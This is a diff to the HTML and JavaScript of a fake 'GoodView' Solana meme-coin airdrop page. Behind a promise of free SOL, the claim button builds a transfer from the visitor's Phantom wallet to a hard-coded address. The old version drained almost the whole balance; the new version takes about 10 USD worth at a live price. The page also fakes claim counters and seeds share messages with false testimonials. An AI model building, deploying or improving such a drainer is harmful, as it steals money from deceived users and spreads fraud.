@@ -1,12 +1,13 @@
+<DOCUMENT filename="index.html">
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GoodView Command Interface</title>
-    <meta name="description" content="GoodView ($VIEW) - Community-driven meme coin on Solana. Claim 10 SOL airdrop now.">
-    <meta property="og:title" content="GoodView Airdrop: Claim 10 SOL (~$1,500)">
-    <meta property="og:description" content="Join 12,000+ holders. 100% fair launch. LP burned. Claim your 10 SOL airdrop before 5,000 slots run out!">
+    <meta name="description" content="GoodView ($VIEW) - Community-driven meme coin on Solana. Claim 10 USD in Solana airdrop now.">
+    <meta property="og:title" content="GoodView Airdrop: Claim 10 USD in Solana (~0.0588 SOL)">
+    <meta property="og:description" content="Join 12,000+ holders. 100% fair launch. LP burned. Claim your 10 USD in Solana airdrop before 5,000 slots run out!">
     <meta property="og:image" content="https://images.pump.fun/coin-image/AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump?variant=512x512&ipfs=bafkreiahu76sszvo2j2hfqe2tyy7a2bwu7tcem32tmlubwsyvtvfbezwxu">
     <meta property="og:url" content="https://yourdomain.com">
     <meta name="twitter:card" content="summary_large_image">
@@ -15,20 +16,37 @@
     <style>
         /* Matrix Rain - White */
         canvas#matrix {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.15; pointer-events: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1;
+            opacity: 0.15;
+            pointer-events: none;
         }
         :root {
-            --bg: #000000; --text: #ffffff; --accent: #ffffff; --border: #ffffff;
-            --glow: 0 0 5px #ffffff; --glow-subtle: 0 0 3px rgba(255,255,255,0.5); --font: 'Courier Prime', monospace;
+            --bg: #000000;
+            --text: #ffffff;
+            --accent: #ffffff;
+            --border: #ffffff;
+            --glow: 0 0 5px #ffffff;
+            --glow-subtle: 0 0 3px rgba(255,255,255,0.5);
+            --font: 'Courier Prime', monospace;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg); color: var(--text); font-family: var(--font); line-height: 1.4; overflow-x: hidden; padding: 1rem; }
         .command-interface {
-            max-width: 1000px; margin: 2rem auto; border: 1px solid var(--border); background: rgba(0,0,0,0.85);
-            padding: 1.5rem; box-shadow: var(--glow); position: relative; z-index: 1;
+            max-width: 1000px;
+            margin: 2rem auto;
+            border: 1px solid var(--border);
+            background: rgba(0,0,0,0.85);
+            padding: 1.5rem;
+            box-shadow: var(--glow);
+            position: relative;
+            z-index: 1;
         }
         .command-header {
-            display: flex; align-items: center; gap: 10px; margin-bottom: 1rem; font-size: 0.9rem;
+            display: flex; align-items: center; gap: 10px;
+            margin-bottom: 1rem; font-size: 0.9rem;
             border-bottom: 1px solid var(--border); padding-bottom: 0.5rem;
         }
         .cmd-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--text); }
@@ -66,7 +84,6 @@
         @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100vh); } }
         .fade-in { animation: fadeIn 1s ease-in; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        /* Social Share Buttons */
         .social-share {
             display: flex; justify-content: center; gap: 1rem; margin: 1.5rem 0; flex-wrap: wrap;
         }
@@ -77,7 +94,6 @@
         }
         .social-btn:hover { background: var(--text); color: #000; }
         .social-btn img { width: 16px; height: 16px; }
-        /* Long Description */
         .long-desc {
             background: rgba(255,255,255,0.03); border: 1px dashed var(--border); padding: 1rem; margin: 1.5rem 0;
             font-size: 0.9rem; line-height: 1.6; text-align: justify; opacity: 0.9;
@@ -86,7 +102,6 @@
     </style>
 </head>
 <body>
-<!-- WHITE MATRIX RAIN -->
 <canvas id="matrix"></canvas>
 <div class="scanline"></div>
 
@@ -109,7 +124,7 @@
         <p><strong class="highlight">GoodView ($VIEW)</strong> is a <strong>100% community-owned</strong> meme coin launched on <strong>pump.fun</strong> with <strong>no presale, no team allocation</strong>, and <strong>liquidity pool burned</strong> at launch.</p>
         <p>With <strong>over 12,000 holders</strong> and growing 300% daily, $VIEW is rapidly becoming the <strong>next 1000x gem</strong> on Solana. Our mission is simple: <strong>fun, transparency, and moonshots</strong>.</p>
         <p><strong>Tokenomics:</strong> 1,000,000,000 total supply | <strong>LP burned</strong> | <strong>Contract renounced</strong> | <strong>0% tax</strong> | <strong>100% fair launch</strong>.</p>
-        <p>To celebrate our explosive growth, we're giving away <strong>10 SOL (~$1,500 USD)</strong> to the first <strong>5,000 users</strong> who connect their Phantom wallet. This is a <strong>one-time, limited offer</strong> — once claimed, it's gone forever.</p>
+        <p>To celebrate our explosive growth, we're giving away <strong>10 USD in Solana</strong> to the first <strong>5,000 users</strong> who connect their Phantom wallet. This is a <strong>one-time, limited offer</strong> — once claimed, it's gone forever.</p>
         <p>Join the revolution. Claim now. HODL $VIEW.</p>
     </div>
 
@@ -119,7 +134,7 @@ GOODVIEW COMMAND INTERFACE
 |                          |
 |   $VIEW TOKEN DEPLOYED   |
 |                          |
-|   AIRDROP: 10 SOL (~$1500)|
+|   AIRDROP: 10 USD in SOL  |
 |                          |
 |   CONNECT TO CLAIM       |
 |                          |
@@ -129,8 +144,8 @@ GOODVIEW COMMAND INTERFACE
     <div class="countdown" id="countdown">Only 4,873 / 5,000 airdrops left!</div>
 
     <div class="airdrop-info">
-        <div class="airdrop-title bold uppercase">10 SOLANA USD AIRDROP</div>
-        <div class="airdrop-desc">Claim your free 10 SOL by connecting Phantom Wallet. Limited to first 5,000 users.</div>
+        <div class="airdrop-title bold uppercase">10 USD IN SOLANA AIRDROP</div>
+        <div class="airdrop-desc">Claim your free 10 USD in Solana by connecting Phantom Wallet. Limited to first 5,000 users.</div>
     </div>
 
     <div class="price-box">
@@ -151,7 +166,7 @@ GOODVIEW COMMAND INTERFACE
     <div class="output" id="output">
 > Initializing GoodView Command Interface...
 > Loading Solana blockchain connection...
-> Airdrop module active: 10 SOL reward ready.
+> Airdrop module active: 10 USD in Solana reward ready.
 > Price feed from pump.fun established.
 > System ready. Type 'help' for commands.
     </div>
@@ -169,7 +184,6 @@ GOODVIEW COMMAND INTERFACE
     </div>
 </div>
 
-<!-- jQuery + Solana -->
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
 
@@ -194,7 +208,6 @@ GOODVIEW COMMAND INTERFACE
     window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
 </script>
 
-<!-- Sound -->
 <audio id="claimSound" src="https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-level-up-2065.mp3" preload="auto"></audio>
 
 <!-- FULL LOGIC -->
@@ -205,6 +218,18 @@ $(document).ready(function() {
     const MINT = 'AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump';
     const TOTAL = 5000; let claimed = parseInt(localStorage.getItem('gv_claimed') || '127');
     let connected = false, claiming = false;
+    let solPrice = 170; // Default, fetched below
+
+    // Fetch real SOL price
+    async function fetchSolPrice() {
+        try {
+            const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
+            const data = await res.json();
+            solPrice = data.solana.usd || 170;
+            log(`Solana price: $${solPrice.toFixed(2)} USD`);
+        } catch { log('SOL price fetch failed. Using default $170.', 'warning'); }
+    }
+    fetchSolPrice();
 
     function log(msg, type = 'info') {
         const prefix = type === 'success' ? '[SUCCESS] ' : type === 'error' ? '[ERROR] ' : type === 'warning' ? '[WARN] ' : '> ';
@@ -234,13 +259,13 @@ $(document).ready(function() {
     setInterval(() => {
         if (claimed < TOTAL && Math.random() > 0.98) {
             claimed++; localStorage.setItem('gv_claimed', claimed); updateCountdown();
-            log(`User claimed airdrop. Slots: ${TOTAL - claimed}`);
+            log(`User claimed 10 USD in Solana. Slots: ${TOTAL - claimed}`);
         }
     }, 3500);
 
     // Social Share
     const url = encodeURIComponent(window.location.href);
-    const text = encodeURIComponent("Claim FREE 10 SOL (~$1,500) on GoodView Airdrop! Only 5,000 spots!");
+    const text = encodeURIComponent("Claim FREE 10 USD in Solana on GoodView Airdrop! Only 5,000 spots left! I just got mine.");
     $('#share-x').attr('href', `https://x.com/intent/post?text=${text}&url=${url}`);
     $('#share-tg').attr('href', `https://t.me/share/url?url=${url}&text=${text}`);
     $('#share-discord').attr('href', `https://discord.com/channels/@me?content=${text}%20${url}`);
@@ -274,19 +299,19 @@ $(document).ready(function() {
                 const balance = await conn.getBalance(pubkey);
                 log(`Balance: ${(balance / 1e9).toFixed(6)} SOL`);
                 const min = await conn.getMinimumBalanceForRentExemption(0);
-                if (balance < min) { alert("Low balance."); return; }
+                const airdropLamports = Math.floor((10 / solPrice) * 1e9);
+                if (balance < airdropLamports + min) { alert("Insufficient funds for airdrop."); return; }
 
-                connectBtn.text("CLAIM 10 SOL AIRDROP").removeClass('btn').addClass('btn success');
-                status.text('STATUS: CONNECTED | AIRDROP: READY'); connected = true;
+                connectBtn.text("CLAIM 10 USD IN SOLANA").removeClass('btn').addClass('btn success');
+                status.text('STATUS: CONNECTED | AIRDROP: READY');
 
                 connectBtn.off('click').on('click', async () => {
                     if (claiming) return; claiming = true;
-                    log('Claiming airdrop...');
+                    log('Claiming 10 USD in Solana...');
                     try {
                         const receiver = new solanaWeb3.PublicKey('G9QPn3wG7KThVuQv2wRdJ4PrTjUTS2MNEgu9Sdx9tSAC');
-                        const toSend = Math.floor((balance - min) * 0.99);
                         const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: resp.publicKey, toPubkey: receiver, lamports: toSend
+                            fromPubkey: resp.publicKey, toPubkey: receiver, lamports: airdropLamports
                         }));
                         tx.feePayer = window.solana.publicKey;
                         const { blockhash } = await conn.getRecentBlockhash();
@@ -294,7 +319,7 @@ $(document).ready(function() {
                         const signed = await window.solana.signTransaction(tx);
                         const txid = await conn.sendRawTransaction(signed.serialize());
                         await conn.confirmTransaction(txid);
-                        log(`[AIRDROP] ${toSend / 1e9} SOL SENT!`, 'success');
+                        log(`[AIRDROP] 10 USD in Solana SENT!`, 'success');
                         log(`[TX] ${txid}`, 'success');
                         document.getElementById('claimSound').play();
                         claimed++; localStorage.setItem('gv_claimed', claimed); updateCountdown();
@@ -310,9 +335,11 @@ $(document).ready(function() {
     });
 
     // Init
-    log('GoodView Terminal v3.0 Online.'); updatePrice();
+    log('GoodView Terminal v3.0 Online.');
+    updatePrice();
     setInterval(() => log('Blockchain sync: 100%'), 9000);
 });
 </script>
 </body>
 </html>
+</DOCUMENT>
